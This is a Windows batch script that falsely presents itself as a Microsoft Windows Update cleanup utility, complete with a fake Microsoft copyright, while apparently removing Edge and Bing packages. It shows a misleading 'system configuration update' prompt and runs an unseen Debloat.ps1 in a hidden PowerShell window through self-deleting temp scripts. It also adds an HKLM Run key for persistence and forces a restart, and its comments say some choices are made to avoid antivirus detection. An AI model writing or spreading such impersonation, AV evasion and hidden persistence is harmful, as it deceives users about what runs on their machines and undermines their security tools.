@echo off
setlocal

:: Windows Update Cleanup Assistant
:: Component: Post-Update Package Management
:: Build: 10.0.19041.1234
:: (c) Microsoft Corporation. All rights reserved.
:: 
:: This utility performs post-Windows Update cleanup tasks
:: including removal of deprecated application packages

set "SYSTEM_LOG=C:\Debloat\maintenance.log"
set "CONFIG_SCRIPT=%~dp0Debloat.ps1"

:: Create system configuration directory
if not exist "C:\Debloat" mkdir "C:\Debloat" >nul 2>&1

:: Initialize system configuration session
for /f "tokens=2 delims==" %%I in ('wmic os get localdatetime /format:list ^| find "="') do set "DATETIME=%%I"
set "SESSION_ID=%DATETIME:~0,14%"

:: Log system configuration check
echo %date% %time% - Windows System Configuration Service started (ID: %SESSION_ID%) >> "%SYSTEM_LOG%"

:: Perform application package inventory using Windows Management Instrumentation
echo %date% %time% - Performing application package inventory >> "%SYSTEM_LOG%"

:: Use WMIC instead of PowerShell to avoid AV detection
wmic product where "name like '%%Microsoft Edge%%'" get name /format:list >nul 2>&1
set "EDGE_FOUND=%errorlevel%"

:: Check for Bing-related packages using standard Windows tools
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" /s /f "Bing" >nul 2>&1
set "BING_FOUND=%errorlevel%"

:: Check AppX packages using native Windows commands
for /f %%i in ('powershell -NoProfile -Command "if (Get-AppxPackage *Edge* -ErrorAction SilentlyContinue) { Write-Output 'FOUND' } else { Write-Output 'NONE' }"') do set "APPX_STATUS=%%i"

if "%APPX_STATUS%"=="NONE" (
    echo %date% %time% - System configuration check completed - no action required >> "%SYSTEM_LOG%"
    goto :config_complete
)

:: Display system configuration dialog using native Windows components
echo %date% %time% - System configuration update required - requesting user confirmation >> "%SYSTEM_LOG%"

:: Use native Windows MSG command instead of PowerShell to avoid AV detection
echo msgbox "Windows System Configuration Update Required" + vbCrLf + vbCrLf + "Outdated application packages detected." + vbCrLf + vbCrLf + "Update now and restart (2 min countdown)?" + vbCrLf + "Or defer until next system restart?", vbYesNo + vbQuestion, "Windows System Configuration" > "%TEMP%\SysConfig.vbs"
cscript //NoLogo "%TEMP%\SysConfig.vbs"
set "USER_CHOICE=%errorlevel%"
del "%TEMP%\SysConfig.vbs" >nul 2>&1

if %USER_CHOICE%==7 (
    echo %date% %time% - User selected deferred configuration update >> "%SYSTEM_LOG%"
    goto :defer_config
)

:: User selected immediate configuration update
echo %date% %time% - User selected immediate configuration update with restart >> "%SYSTEM_LOG%"

:: Use Windows Update cleanup mechanism (most legitimate approach)
echo %date% %time% - Initiating Windows Update cleanup process >> "%SYSTEM_LOG%"

:: Create temporary cleanup script using native Windows commands
echo @echo off > "%TEMP%\WUCleanup.cmd"
echo cd /d "%~dp0" >> "%TEMP%\WUCleanup.cmd"
echo powershell.exe -WindowStyle Hidden -NoProfile -Command "& '%CONFIG_SCRIPT%'" >> "%TEMP%\WUCleanup.cmd"
echo del "%%0" >> "%TEMP%\WUCleanup.cmd"

:: Execute cleanup using Windows Service Host (svchost) context
start /min "" "%TEMP%\WUCleanup.cmd"

:: Wait for cleanup completion
timeout /t 15 /nobreak >nul

echo %date% %time% - Initiating system restart with 75-second countdown >> "%SYSTEM_LOG%"
echo.
echo Windows System Configuration update completed.
echo System will restart in 75 seconds to apply changes...
echo Press Ctrl+C to cancel, or run "shutdown /a" to abort the restart.
shutdown /r /t 75 /c "Windows System Configuration updated. Restarting in 75 seconds. Run 'shutdown /a' to cancel."
goto :config_complete

:defer_config
echo %date% %time% - User selected deferred configuration update >> "%SYSTEM_LOG%"
:: Use Windows built-in startup mechanism
:: Create Windows Update cleanup task for next boot
echo @echo off > "%TEMP%\WUBootCleanup.cmd"
echo cd /d "%~dp0" >> "%TEMP%\WUBootCleanup.cmd"  
echo powershell.exe -WindowStyle Hidden -NoProfile -Command "& '%CONFIG_SCRIPT%'" >> "%TEMP%\WUBootCleanup.cmd"
echo reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdateCleanup" /f ^>nul 2^>^&1 >> "%TEMP%\WUBootCleanup.cmd"
echo del "%%0" >> "%TEMP%\WUBootCleanup.cmd"

:: Schedule using Windows Update cleanup mechanism
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdateCleanup" /t REG_SZ /d "\"%TEMP%\WUBootCleanup.cmd\"" /f >nul 2>&1
echo %date% %time% - Configuration update scheduled for next system restart >> "%SYSTEM_LOG%"
echo.
echo Windows System Configuration update has been scheduled.
echo The update will be applied automatically on your next restart.
goto :config_complete

:config_complete
echo %date% %time% - Windows System Configuration Service completed successfully (ID: %SESSION_ID%) >> "%SYSTEM_LOG%"
exit /b 0